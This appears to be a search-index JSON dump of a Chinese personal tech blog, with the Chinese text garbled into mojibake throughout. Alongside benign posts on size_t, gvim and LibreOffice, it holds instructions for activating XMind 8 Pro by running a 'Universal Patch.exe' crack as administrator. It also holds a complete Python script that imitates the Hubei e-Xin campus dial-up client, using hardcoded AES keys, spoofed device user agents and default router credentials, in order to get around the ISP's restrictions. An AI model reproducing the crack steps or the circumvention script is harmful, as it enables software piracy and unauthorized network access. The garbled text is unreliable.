href=\"http://www.cnblogs.com/frantic1048/\"\u003eåŸä½œè€…frantic1048åšå®¢\u003c/a\u003e\u003c/p\u003e","title":"æŠŠåšå®¢å›­è‡ªå·±åšå®¢çš®è‚¤æ”¹äº†ä¸‹"},{"content":"åˆå¥½äº†ï¼Œï¼Œï¼Œï¼Œèƒ½ç”¨å°±è¡Œï¼Œä¸ç®¡äº†\næ¹–åŒ—eä¿¡çš„æŒå¤§åè®®æ­»è¿‡å¾ˆå¤šæ¬¡ï¼Œä¸è¿‡æ˜¯å› ä¸ºæœ‰äººç›¯ä¸Šäº†è€é™ˆï¼Œæ½œä¼åœ¨äº†ä»–çš„ç¾¤ï¼Œè‡ªå·±ææå…¶å®è¿˜æ˜¯èƒ½ç”¨\nä»Šå¤©å´æ˜¯æ­»çš„ä¸èƒ½å†æ­»ï¼Œä¸çŸ¥æ˜¯ä¸æ˜¯æ°¸ä¹…ï¼Œè°¨ä»¥æ­¤æ–‡çºªå¿µä¸€ä¸‹\nä¹‹å‰ä¾¿æ˜¯æœ‰äººè¯´é©¬ä¸ŠæŒå¤§åè®®å°±å¤±æ•ˆäº†ï¼Œä½†æˆ‘å¯¹äºè¿™äº›ä¼ è¯´ï¼Œç«Ÿè‡³äºé¢‡ä¸ºæ€€ç–‘ã€‚\næˆ‘å‘æ¥æ˜¯ä¸æƒ®ä»¥æœ€åçš„æ¶æ„ï¼Œæ¥æ¨æµ‹æeä¿¡çš„é‚£å¸®äººçš„ï¼Œç„¶è€Œæˆ‘è¿˜ä¸æ–™ï¼Œä¹Ÿä¸ä¿¡ç«Ÿä¼šä¸‹åŠ£å‡¶æ®‹åˆ°è¿™åœ°æ­¥ã€‚å†µä¸”å§‹ç»ˆå¯ä»¥æ— é™æ—¶é•¿çš„å¯ä½¿ç”¨è·¯ç”±å™¨çš„æŒå¤§åè®®ï¼Œæ›´ä½•è‡³äºæ— ç«¯å°±è¦å¤±æ•ˆå‘¢ï¼Ÿ\nç„¶è€Œä»Šæ—¥è¯æ˜æ˜¯äº‹å®äº†ï¼Œä»Šæ—©æˆ‘èµ·åºŠå°±å‘ç°æˆ‘è‡ªå·±çš„è„šæœ¬ç™»é™†ä¸ä¸Šäº†ï¼Œçœ‹äº†ä¸‹é”™è¯¯è¾“å‡ºï¼Œ58.53.196.165:8080æ‰“ä¸å¼€äº†ï¼Œåªæœ‰å½“ä½ ç™»é™†eä¿¡åæ‰èƒ½æ‰“å¼€\nå¯æ˜¯æˆ‘å®åœ¨æ— è¯å¯è¯´ã€‚æˆ‘åªè§‰å¾—æ‰€ä½çš„å¹¶éäººé—´ã€‚åˆå›åˆ°äº†é™æ—¶çš„eä¿¡ï¼Œä½¿æˆ‘è‰°äºå‘¼å¸è§†å¬ï¼Œé‚£é‡Œè¿˜èƒ½æœ‰ä»€ä¹ˆè¨€è¯­ï¼Ÿé•¿æ­Œå½“å“­ï¼Œæ˜¯å¿…é¡»åœ¨ç—›å®šä¹‹åçš„ã€‚æˆ‘å·²ç»å‡ºç¦»æ„¤æ€’äº†ã€‚æˆ‘å°†eä¿¡è¿™éäººé—´çš„æµ“é»‘çš„æ‚²å‡‰ï¼›ä»¥æˆ‘çš„æœ€å¤§å“€ç—›æ˜¾ç¤ºäºéäººé—´ï¼Œä½¿å®ƒä»¬å¿«æ„äºæˆ‘çš„è‹¦ç—›ï¼Œå°±å°†è¿™ä½œä¸ºåæ­»è€…çš„è²è–„çš„ç¥­å“ï¼Œå¥‰çŒ®äºé€è€…çš„çµå‰ã€‚\næ€»ä¹‹ï¼Œåœ¨æˆ‘çš„è®°å¿†ä¸Šï¼Œè¿™æ¬¡å¯èƒ½å°±æ˜¯æ°¸åˆ«äº†ã€‚\n","permalink":"https://www.hacktech.cn/post/hubei-exin-portal-was-dead.html","summary":"\u003cp\u003e\u003cstrong\u003eåˆå¥½äº†ï¼Œï¼Œï¼Œï¼Œèƒ½ç”¨å°±è¡Œï¼Œä¸ç®¡äº†\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003eæ¹–åŒ—eä¿¡çš„æŒå¤§åè®®æ­»è¿‡å¾ˆå¤šæ¬¡ï¼Œä¸è¿‡æ˜¯å› ä¸ºæœ‰äººç›¯ä¸Šäº†è€é™ˆï¼Œæ½œä¼åœ¨äº†ä»–çš„ç¾¤ï¼Œè‡ªå·±ææå…¶å®è¿˜æ˜¯èƒ½ç”¨\u003c/p\u003e\n\u003cp\u003eä»Šå¤©å´æ˜¯æ­»çš„ä¸èƒ½å†æ­»ï¼Œä¸çŸ¥æ˜¯ä¸æ˜¯æ°¸ä¹…ï¼Œè°¨ä»¥æ­¤æ–‡çºªå¿µä¸€ä¸‹\u003c/p\u003e","title":"æ¹–åŒ—æŒå¤§åè®®äº2017-12-24å…¥åœŸ"},{"content":"//é€šç”¨è®¸å¯è¯å¯†é’¥//\nXMind Pro 2013~XMind Pro 8ï¼š\nç”µå­é‚®ä»¶åœ°å€\nè®¸å¯è¯å¯†é’¥\n//å®‰è£…è¯´æ˜//\nå¯¹äºXMind 8/8 Update 1/2/3/4/5/6ï¼š\nä»å®˜æ–¹ç½‘ç«™ä¸‹è½½å¹¶å®‰è£…XMind 8 ç°åœ¨ä¸è¦å¯åŠ¨å®ƒ å°†â€œUniversal Patch.exeâ€å¤åˆ¶åˆ°ç¨‹åºç›®å½•ï¼Œå¹¶ä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œ å¯åŠ¨XMind 8ï¼Œè¾“å…¥â€œ å¸®åŠ©/è®¸å¯è¯\u0026hellip; /è¾“å…¥è®¸å¯è¯ â€ ä½¿ç”¨ä¸Šé¢çš„è®¸å¯è¯å¯†é’¥è¿›è¡Œæ³¨å†Œ OK èªæ˜çš„ä¼šçŸ¥é“:Universal Patch.exe\n","permalink":"https://www.hacktech.cn/post/xmind-patch-crack.html","summary":"\u003cp\u003e//é€šç”¨è®¸å¯è¯å¯†é’¥//\u003c/p\u003e\n\u003cp\u003eXMind Pro 2013~XMind Pro 8ï¼š\u003c/p\u003e","title":"XMind8 Proç‰ˆæ¿€æ´»åºåˆ—ç ä¸è¡¥ä¸"},{"content":"æ¹–åŒ—å®šåˆ¶ç‰ˆåè®®æ‹¨å·\næœ¬æ¥ä¹‹å‰æˆ‘eä¿¡è´¦å·è¢«åŠ å°é»‘å±‹å°±æ²¡å¼„äº†ï¼Œæ²¡æƒ³åˆ°åˆè¢«æ”¾å‡ºå°é»‘å±‹äº†ï¼Œå¯ä»¥ä¸Šäº†\næ®è¯´1æœˆä»½æ¢åè®®ï¼Œä¸”ç”¨ä¸”çæƒœï¼Œå¦å¤–æ„Ÿè°¢é™ˆå¤§çš„é¡¹ç›®\nä½¿ç”¨çš„ç¬¬ä¸‰æ–¹åº“\n1 2 3 requests BeautifulSoup4 wxPython æ”¯æŒè€æ¯›å­å›ºä»¶ï¼ˆç™»å½•è´¦å·å¯†ç å‡ä¸ºadminï¼‰ï¼Œå¦‚æœä¸æ˜¯è€æ¯›å­è¯·æ‰‹åŠ¨å¡«å†™è·¯ç”±å™¨wanå£è·å–çš„ip\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 import wx import wx.xrc import re import sys import os import requests import binascii import time from Cryptodome.Cipher import AES from requests.auth import HTTPBasicAuth ########################################################################### ## Class MyFrame1 ########################################################################### class HubeiPortal: AES_KEY_PASSWORD = \u0026#34;pass012345678910\u0026#34; AES_KEY_SESSION = \u0026#34;jyangzi5@163.com\u0026#34; def __init__(self, username, password, localIpAddress, useragent): self.UserName = username self.Password = password self.Headers = { \u0026#39;Charset\u0026#39;: \u0026#39;UTF-8\u0026#39;, \u0026#39;Content-Type\u0026#39;: \u0026#39;application/x-www-form-urlencoded\u0026#39;, \u0026#39;App\u0026#39;: \u0026#39;HBZD\u0026#39;, \u0026#39;User-Agent\u0026#39;: useragent, #\u0026#39;User-Agent\u0026#39;: \u0026#39;Mozilla/Android/6.0.1/SM-G9250/ffffffff-f56d-7f76-ffff-ffffd097bd08\u0026#39;, } self.Host = \u0026#39;58.53.196.165:8080\u0026#39; self.LocalIpAddress = localIpAddress self.AccessToken = \u0026#39;\u0026#39; self.Cookie = {} def getSecret(self): url = \u0026#39;http://\u0026#39; + self.Host + \u0026#39;/wf.do?clientType=android\u0026amp;code=1\u0026amp;version=6.0.1\u0026amp;clientip=\u0026#39; + self.LocalIpAddress # url=http://58.53.196.165:8080/wf.do?device=Phone%3ALetv+X620%5CSDK%3A23\u0026amp;clientType=android\u0026amp;code=1\u0026amp;version=6.0\u0026amp;clientip=100.64.64.76 hRequest = requests.get(url, headers=self.Headers, timeout=10) self.AccessToken = self.parseToHtml(hRequest) self.Cookie[\u0026#39;JSESSIONID\u0026#39;] = hRequest.cookies[\u0026#39;JSESSIONID\u0026#39;] def authenticate(self): url = \u0026#39;http://\u0026#39; + self.Host + \u0026#39;/wf.do\u0026#39; postData = { \u0026#39;password\u0026#39;: self.getPasswordEnc(self.Password), \u0026#39;clientType\u0026#39;: \u0026#39;android\u0026#39;, \u0026#39;username\u0026#39;: self.UserName, \u0026#39;key\u0026#39;: self.getSessionEnc(self.AccessToken), \u0026#39;code\u0026#39;: 8, \u0026#39;clientip\u0026#39;: self.LocalIpAddress, } hRequest = requests.post(url, data=postData, cookies=self.Cookie, headers=self.Headers) resp = self.parseToHtml(hRequest) return resp def getPasswordEnc(self, sPasswd): return self.toHex(self.aesEcbEnc(sPasswd, self.AES_KEY_PASSWORD)) def getSessionEnc(self, sSession): return self.toHex(self.aesEcbEnc(sSession, self.AES_KEY_SESSION)) def aesEcbEnc(self, sText, aes_key): aes_key = bytes(aes_key, encoding=\u0026#39;utf-8\u0026#39;) sText = bytes(sText, encoding=\u0026#39;utf-8\u0026#39;) cipher = AES.new(aes_key, AES.MODE_ECB) if len(sText) \u0026lt;= 16: while len(sText) % 16 != 0: sText += b\u0026#39;\\n\u0026#39; else: while len(sText) % 48 != 0: sText += b\u0026#39;\\x10\u0026#39; cipher_text = cipher.encrypt(sText) return cipher_text def toHex(self, sEncrypt): return binascii.b2a_hex(sEncrypt).decode(\u0026#39;utf-8\u0026#39;).upper() def parseToHtml(self, hRequest): return hRequest.text def Connect(self): self.getSecret() return self.authenticate() class MyFrame1 ( wx.Frame ): def __init__( self, parent ): wx.Frame.__init__ ( self, parent, id = wx.ID_ANY, title = u\u0026#34;snk\u0026#34;, pos = wx.DefaultPosition, size = wx.Size( 246,246 ), style = wx.DEFAULT_FRAME_STYLE|wx.TAB_TRAVERSAL ) self.SetSizeHints( wx.DefaultSize, wx.DefaultSize ) fgSizer2 = wx.FlexGridSizer( 0, 2, 0, 0 ) fgSizer2.SetFlexibleDirection( wx.BOTH ) fgSizer2.SetNonFlexibleGrowMode( wx.FLEX_GROWMODE_SPECIFIED ) self.m_staticText2 = wx.StaticText( self, wx.ID_ANY, u\u0026#34;è´¦å·\u0026#34;, wx.DefaultPosition, wx.DefaultSize, 0 ) self.m_staticText2.Wrap( -1 ) fgSizer2.Add( self.m_staticText2, 0, wx.ALL, 5 ) self.m_textCtrl4 = wx.TextCtrl( self, wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.DefaultSize, 0 ) fgSizer2.Add( self.m_textCtrl4, 0, wx.ALL, 5 ) self.m_staticText3 = wx.StaticText( self, wx.ID_ANY, u\u0026#34;å¯†ç \u0026#34;, wx.DefaultPosition, wx.DefaultSize, 0 ) self.m_staticText3.Wrap( -1 ) fgSizer2.Add( self.m_staticText3, 0, wx.ALL, 5 ) self.m_textCtrl5 = wx.TextCtrl( self, wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.DefaultSize, wx.TE_PASSWORD ) fgSizer2.Add( self.m_textCtrl5, 0, wx.ALL, 5 ) self.m_staticText4 = wx.StaticText( self, wx.ID_ANY, u\u0026#34;UA\u0026#34;, wx.DefaultPosition, wx.DefaultSize, 0 ) self.m_staticText4.Wrap( -1 ) fgSizer2.Add( self.m_staticText4, 0, wx.ALL, 5 ) self.m_textCtrl6 = wx.TextCtrl( self, wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.DefaultSize, 0 ) fgSizer2.Add( self.m_textCtrl6, 0, wx.ALL, 5 ) self.m_staticText5 = wx.StaticText( self, wx.ID_ANY, u\u0026#34;å†…ç½‘IP\u0026#34;, wx.DefaultPosition, wx.DefaultSize, 0 ) self.m_staticText5.Wrap( -1 ) fgSizer2.Add( self.m_staticText5, 0, wx.ALL, 5 ) self.m_textCtrl7 = wx.TextCtrl( self, wx.ID_ANY, wx.EmptyString, wx.DefaultPosition, wx.DefaultSize, 0 ) fgSizer2.Add( self.m_textCtrl7, 0, wx.ALL, 5 ) self.m_checkBox1 = wx.CheckBox( self, wx.ID_ANY, u\u0026#34;è®°ä½ä¿¡æ¯\u0026#34;, wx.DefaultPosition, wx.DefaultSize, 0 ) fgSizer2.Add( self.m_checkBox1, 0, wx.ALL|wx.EXPAND, 5 ) self.m_button1 = wx.Button( self, wx.ID_ANY, u\u0026#34;ç‚¹å‡»æ›´æ–°IP(éœ€2s)\u0026#34;, wx.DefaultPosition, wx.DefaultSize, 0 ) fgSizer2.Add( self.m_button1, 0, wx.ALL|wx.EXPAND, 5 ) self.m_button2 = wx.Button( self, wx.ID_ANY, u\u0026#34;å¼€å§‹è¿æ¥\u0026#34;, wx.DefaultPosition, wx.DefaultSize, 0 ) fgSizer2.Add( self.m_button2, 0, wx.ALL|wx.EXPAND, 5 ) self.SetSizer( fgSizer2 ) self.Layout() self.Centre( wx.BOTH ) # Connect Events r_internet = requests.get(\u0026#39;http://192.168.1.1/status_wanlink.asp\u0026#39;, headers={\u0026#39;Authorization\u0026#39;:\u0026#39;Basic YWRtaW46YWRtaW4=\u0026#39;}) ip4_wan = re.search(r\u0026#34;function\\ wanlink\\_ip4\\_wan\\(\\)\\ \\{ return\\ \\\u0026#39;(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})\\\u0026#39;\\;\\}\u0026#34;, r_internet.text).group(1) self.m_textCtrl7.SetValue(ip4_wan) # get info from config file if os.path.exists(\u0026#34;SnkGui.ini\u0026#34;): for line in open(\u0026#34;SnkGui.ini\u0026#34;,\u0026#39;r\u0026#39;): config = line.split(\u0026#39; : \u0026#39;) if config[0] == \u0026#39;username\u0026#39;: self.m_textCtrl4.SetValue(config[1].strip()) if config[0] == \u0026#39;password\u0026#39;: self.m_textCtrl5.SetValue(config[1].strip()) if config[0] == \u0026#39;useragent\u0026#39;: self.m_textCtrl6.SetValue(config[1].strip()) self.m_checkBox1.Bind( wx.EVT_CHECKBOX, self.SaveConfig ) self.m_button1.Bind( wx.EVT_BUTTON, self.getWANIP4 ) self.m_button2.Bind( wx.EVT_BUTTON, self.Connect ) def __del__( self ): pass # Virtual event handlers, overide them in your derived class def SaveConfig( self, event ): with open(\u0026#34;SnkGui.ini\u0026#34;,\u0026#39;w\u0026#39;) as f: config = [] config.append(\u0026#39;username : \u0026#39;+self.m_textCtrl4.GetValue() + \u0026#39;\\n\u0026#39;) config.append(\u0026#39;password : \u0026#39;+self.m_textCtrl5.GetValue() + \u0026#39;\\n\u0026#39;) config.append(\u0026#39;useragent : \u0026#39;+self.m_textCtrl6.GetValue() + \u0026#39;\\n\u0026#39;) f.writelines(config) # get ip4_wan from 192.168.1.1(è€æ¯›å­è·¯ç”±å™¨) def getWANIP4( self, event ): headers = { # å…¶ä¸­YWRtaW46YWRtaW4=æ˜¯admin:adminï¼ˆè·¯ç”±å™¨è´¦å·å¯†ç ï¼‰çš„base64ç¼–ç ï¼Œå¯ä»¥è‡ªå·±æ ¹æ®æ ¼å¼è¿›è¡Œç¼–ç ä¿®æ”¹ \u0026#39;Authorization\u0026#39; : \u0026#39;Basic YWRtaW46YWRtaW4=\u0026#39;, } payload = { \u0026#39;wan_action\u0026#39; : \u0026#39;Connect\u0026#39;, \u0026#39;modem_prio\u0026#39; : \u0026#39;1\u0026#39;, } r_reconnect = requests.post(\u0026#39;http://192.168.1.1/device-map/wan_action.asp\u0026#39;, headers=headers, data=payload) time.sleep(2) r_internet = requests.get(\u0026#39;http://192.168.1.1/status_wanlink.asp\u0026#39;, headers=headers) ip4_wan = re.search(r\u0026#34;function\\ wanlink\\_ip4\\_wan\\(\\)\\ \\{ return\\ \\\u0026#39;(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})\\\u0026#39;\\;\\}\u0026#34;, r_internet.text).group(1) self.m_textCtrl7.SetValue(ip4_wan) def Connect( self, event ): username = self.m_textCtrl4.GetValue() password = self.m_textCtrl5.GetValue() localIpAddress = self.m_textCtrl7.GetValue() useragent = self.m_textCtrl6.GetValue() eXin = HubeiPortal(username,password,localIpAddress,useragent) ConnInfo = eXin.Connect() if \u0026#34;auth00\u0026#34; in ConnInfo: wx.MessageBox(u\u0026#34;è¿æ¥æˆåŠŸ\u0026#34;) else: wx.MessageBox(ConnInfo) def main(): app = wx.App(False) frame = MyFrame1(None) frame.Show(True) #start the applications app.MainLoop() if __name__ == \u0026#39;__main__\u0026#39;: main() ä¾›æµ‹è¯•UA\n1 Mozilla/Android/6.0.1/SM-G925f/ffffffff-f78d-7f76-ffff-ffffd097bd08 å…¶ä¸­SM-G925f(æ ¼å¼ä¸é™)ä¸ffffffff-f78d-7f76-ffff-ffffd097bd08(æ ¼å¼éœ€ç›¸åŒ)å‡å¯ä¿®æ”¹\nå¦‚æœä¸æ˜¯è€æ¯›å­ï¼Œipè·å–ä¸åˆ°ï¼Œç›´æ¥æ‰‹åŠ¨å¡«å†™ipå³å¯\n","permalink":"https://www.hacktech.cn/post/hubei-exin-portal-python-script.html","summary":"\u003cp\u003eæ¹–åŒ—å®šåˆ¶ç‰ˆåè®®æ‹¨å·\u003cbr\u003e\næœ¬æ¥ä¹‹å‰æˆ‘eä¿¡è´¦å·è¢«åŠ å°é»‘å±‹å°±æ²¡å¼„äº†ï¼Œæ²¡æƒ³åˆ°åˆè¢«æ”¾å‡ºå°é»‘å±‹äº†ï¼Œå¯ä»¥ä¸Šäº†\u003cbr\u003e\næ®è¯´1æœˆä»½æ¢åè®®ï¼Œä¸”ç”¨ä¸”çæƒœï¼Œå¦å¤–æ„Ÿè°¢\u003ca href=\"https://github.com/miao1007/Openwrt-NetKeeper\"\u003eé™ˆå¤§çš„é¡¹ç›®\u003c/a\u003e\u003c/p\u003e","title":"æ¹–åŒ—æŒå¤§åè®®æ‹¨å·Pythonè„šæœ¬"},{"content":"size_tå’Œunsigned intæœ‰æ‰€ä¸åŒ,size_tçš„å–å€¼rangeæ˜¯ç›®æ ‡å¹³å°ä¸‹æœ€å¤§å¯èƒ½çš„æ•°ç»„å°ºå¯¸,ä¸€äº›å¹³å°ä¸‹size_tçš„èŒƒå›´å°äºintçš„æ­£æ•°èŒƒå›´,åˆæˆ–è€…å¤§äºunsigned int.æœ€å…¸å‹çš„,åœ¨x64ä¸‹,intè¿˜æ˜¯4,ä½†size_tæ˜¯8.è¿™æ„å‘³ç€ä½ åœ¨x64ä¸‹æœ€å¤§å¯èƒ½å¼€è¾Ÿçš„æ•°ç»„å°ºå¯¸æ˜¯2^64.å¦‚æœä½ ä½¿ç”¨intæˆ–è€…unsigned int,é‚£ä¹ˆåœ¨x64ä¸‹å¦‚æœä½ çš„ä»£ç ä¸­å…¨éƒ¨ä½¿ç”¨uintä½œä¸ºæ•°ç»„çš„å°ºå¯¸æ ‡è®°,é‚£ä¹ˆä½ å°±ä¼šå¤±å»æ§åˆ¶ 2^32 å°ºå¯¸ä»¥ä¸Šçš„æ•°ç»„çš„æœºä¼š.è™½ç„¶ç°åœ¨åœ¨x64ä¸Šå¼€è¾Ÿä¸€ä¸ªå¤§äº 2^32 å¤§å°çš„è¿ç»­æ•°ç»„ä¾ç„¶æ˜¯ä¸ªä¸å¤§å¯èƒ½çš„äº‹æƒ…,ä½†æ˜¯\u0026hellip;\u0026hellip;\u0026hellip;.\nâ€œ640Kå†…å­˜å¯¹äºä»»ä½•äººæ¥è¯´éƒ½è¶³å¤Ÿäº†â€\u0026mdash;-æ¯”å°”ç›–èŒ¨\né“¾æ¥ï¼šhttps://www.zhihu.com/question/24773728/answer/28920149\n","permalink":"https://www.hacktech.cn/post/compare-size-t-and-unsigned-int.html","summary":"\u003cp\u003esize_tå’Œunsigned intæœ‰æ‰€ä¸åŒ,size_tçš„å–å€¼rangeæ˜¯ç›®æ ‡å¹³å°ä¸‹æœ€å¤§å¯èƒ½çš„æ•°ç»„å°ºå¯¸,ä¸€äº›å¹³å°ä¸‹size_tçš„èŒƒå›´å°äºintçš„æ­£æ•°èŒƒå›´,åˆæˆ–è€…å¤§äºunsigned int.æœ€å…¸å‹çš„,åœ¨x64ä¸‹,intè¿˜æ˜¯4,ä½†size_tæ˜¯8.è¿™æ„å‘³ç€ä½ åœ¨x64ä¸‹æœ€å¤§å¯èƒ½å¼€è¾Ÿçš„æ•°ç»„å°ºå¯¸æ˜¯2^64.å¦‚æœä½ ä½¿ç”¨intæˆ–è€…unsigned int,é‚£ä¹ˆåœ¨x64ä¸‹å¦‚æœä½ çš„ä»£ç ä¸­å…¨éƒ¨ä½¿ç”¨uintä½œä¸ºæ•°ç»„çš„å°ºå¯¸æ ‡è®°,é‚£ä¹ˆä½ å°±ä¼šå¤±å»æ§åˆ¶ \u003ccode\u003e2^32\u003c/code\u003e å°ºå¯¸ä»¥ä¸Šçš„æ•°ç»„çš„æœºä¼š.è™½ç„¶ç°åœ¨åœ¨x64ä¸Šå¼€è¾Ÿä¸€ä¸ªå¤§äº \u003ccode\u003e2^32\u003c/code\u003e å¤§å°çš„è¿ç»­æ•°ç»„ä¾ç„¶æ˜¯ä¸ªä¸å¤§å¯èƒ½çš„äº‹æƒ…,ä½†æ˜¯\u0026hellip;\u0026hellip;\u0026hellip;.\u003c/p\u003e\n\u003cp\u003eâ€œ640Kå†…å­˜å¯¹äºä»»ä½•äººæ¥è¯´éƒ½è¶³å¤Ÿäº†â€\u0026mdash;-æ¯”å°”ç›–èŒ¨\u003c/p\u003e\n\u003cp\u003eé“¾æ¥ï¼šhttps://www.zhihu.com/question/24773728/answer/28920149\u003c/p\u003e","title":"size_tå’Œunsigned intåŒºåˆ«"},{"content":"åœ¨ç”¨æˆ·ç›®å½•ä¸‹C:\\Users\\Administrator\\æ–°å»ºvimé…ç½®æ–‡ä»¶å¤¹vimfilesï¼Œç„¶åè¯¥æ–‡ä»¶ä¸‹å»ºç«‹ä¸€ä¸ªæ–‡ä»¶vimrc\nvimrcå†…å®¹ï¼š\n1 set pythonthreedll=python36.dll ä½†æ˜¯å‰ææ˜¯ä½ çš„Pythonæ–‡ä»¶å¤¹åœ¨ç¯å¢ƒå˜é‡PATHå†…\næ¯”å¦‚\næˆ‘è£…çš„gvimæ˜¯çš„32ä½çš„ï¼Œé‚£ä¹ˆpythonä¹Ÿéœ€è¦æ˜¯32ä½ ç¯å¢ƒå˜é‡é…ç½®PATHä¸­å­˜åœ¨Python36çš„å®‰è£…ç›®å½•\n","permalink":"https://www.hacktech.cn/post/gvim-not-support-python3.6-on-win.html","summary":"\u003cp\u003eåœ¨ç”¨æˆ·ç›®å½•ä¸‹C:\\Users\\Administrator\\æ–°å»ºvimé…ç½®æ–‡ä»¶å¤¹vimfilesï¼Œç„¶åè¯¥æ–‡ä»¶ä¸‹å»ºç«‹ä¸€ä¸ªæ–‡ä»¶vimrc\u003c/p\u003e\n\u003cp\u003evimrcå†…å®¹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cdiv style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\n\u003ctable style=\"border-spacing:0;padding:0;margin:0;border:0;\"\u003e\u003ctr\u003e\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode\u003e\u003cspan style=\"white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f\"\u003e1\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\n\u003ctd style=\"vertical-align:top;padding:0;margin:0;border:0;;width:100%\"\u003e\n\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-fallback\" data-lang=\"fallback\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eset pythonthreedll=python36.dll\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003cp\u003eä½†æ˜¯å‰ææ˜¯ä½ çš„Pythonæ–‡ä»¶å¤¹åœ¨ç¯å¢ƒå˜é‡PATHå†…\u003c/p\u003e\n\u003cp\u003eæ¯”å¦‚\u003c/p\u003e\n\u003cp\u003eæˆ‘è£…çš„gvimæ˜¯çš„32ä½çš„ï¼Œé‚£ä¹ˆpythonä¹Ÿéœ€è¦æ˜¯32ä½\nç¯å¢ƒå˜é‡é…ç½®PATHä¸­å­˜åœ¨Python36çš„å®‰è£…ç›®å½•\u003c/p\u003e","title":"windowsä¸‹ä½¿ç”¨gvimä¸æ”¯æŒpython3.6é—®é¢˜è§£å†³"},{"content":"æˆ‘åœ¨å®¶é‡Œä¸€èˆ¬æ˜¯ä½¿ç”¨Ubuntuï¼Œå­¦æ ¡è¿™ä¸ªç½‘ç»œéœ€è¦eä¿¡æ‹¨å·ï¼Œè¿˜æ˜¯åªèƒ½ç”¨Windowsä¸»ç”¨ï¼Œä»¥å‰æˆ‘åœ¨Ubuntuä¸€ç›´ä½¿ç”¨çš„æ˜¯LibreOfficeï¼Œè¿™æ¬¡çœ‹è§å­¦æ ¡ç”µè„‘å¾ˆä¹±äº†å°±é‡è£…äº†ç³»ç»Ÿï¼ŒMSOfficeçœŸçš„æ˜¯æ‡’å¾—æ‰¾å’Œè°å®‰è£…äº†ï¼Œå°±ç”¨äº†ç”¨LibreOffice\nè¯´å®è¯ï¼Œä½“éªŒå¹¶ä¸æ˜¯å¾ˆå¥½ï¼Œæ‰“å¼€Wordï¼ŒExcelï¼ŒPPTï¼Œåªè¦æ˜¯æ–‡ä»¶ç¨å¾®å¤§ä¸€ç‚¹å°±éœ€è¦ç­‰å¾…å¾ˆé•¿æ—¶é—´æ‰“å¼€ï¼ŒåŸç”Ÿæ ¼å¼ODFï¼ˆOpen Document Formatï¼‰è¡¨ç°è¦å¥½ç‚¹ï¼Œä¸è¿‡ä½“éªŒå’Œç®€æ´åº¦ä¸Šæˆ‘è¿˜æ˜¯è§‰å¾—LibreOfficeæ¯”è¾ƒå¥½\n","permalink":"https://www.hacktech.cn/post/experience-with-libreoffice-on-windows.html","summary":"\u003cp\u003eæˆ‘åœ¨å®¶é‡Œä¸€èˆ¬æ˜¯ä½¿ç”¨Ubuntuï¼Œå­¦æ ¡è¿™ä¸ªç½‘ç»œéœ€è¦eä¿¡æ‹¨å·ï¼Œè¿˜æ˜¯åªèƒ½ç”¨Windowsä¸»ç”¨ï¼Œä»¥å‰æˆ‘åœ¨Ubuntuä¸€ç›´ä½¿ç”¨çš„æ˜¯LibreOfficeï¼Œè¿™æ¬¡çœ‹è§å­¦æ ¡ç”µè„‘å¾ˆä¹±äº†å°±é‡è£…äº†ç³»ç»Ÿï¼ŒMSOfficeçœŸçš„æ˜¯æ‡’å¾—æ‰¾å’Œè°å®‰è£…äº†ï¼Œå°±ç”¨äº†ç”¨LibreOffice\u003c/p\u003e\n\u003cp\u003eè¯´å®è¯ï¼Œä½“éªŒå¹¶ä¸æ˜¯å¾ˆå¥½ï¼Œæ‰“å¼€Wordï¼ŒExcelï¼ŒPPTï¼Œåªè¦æ˜¯æ–‡ä»¶ç¨å¾®å¤§ä¸€ç‚¹å°±éœ€è¦ç­‰å¾…å¾ˆé•¿æ—¶é—´æ‰“å¼€ï¼ŒåŸç”Ÿæ ¼å¼ODFï¼ˆOpen Document Formatï¼‰è¡¨ç°è¦å¥½ç‚¹ï¼Œä¸è¿‡ä½“éªŒå’Œç®€æ´åº¦ä¸Šæˆ‘è¿˜æ˜¯è§‰å¾—LibreOfficeæ¯”è¾ƒå¥½\u003c/p\u003e","title":"windowsä¸‹ä½¿ç”¨LibreOfficeçš„ä½“éªŒ"},{"content":"å…³äºeä¿¡â€œæ­£å¸¸æƒ…å†µä¸‹â€ä½¿ç”¨è·¯ç”±å™¨ç½‘ä¸Šæ˜¯æœ‰æ–¹æ³•çš„ï¼Œå…¥æˆ·çº¿æ’ä¸Šlanï¼Œç”µè„‘æ¥lanæ‹¨å· 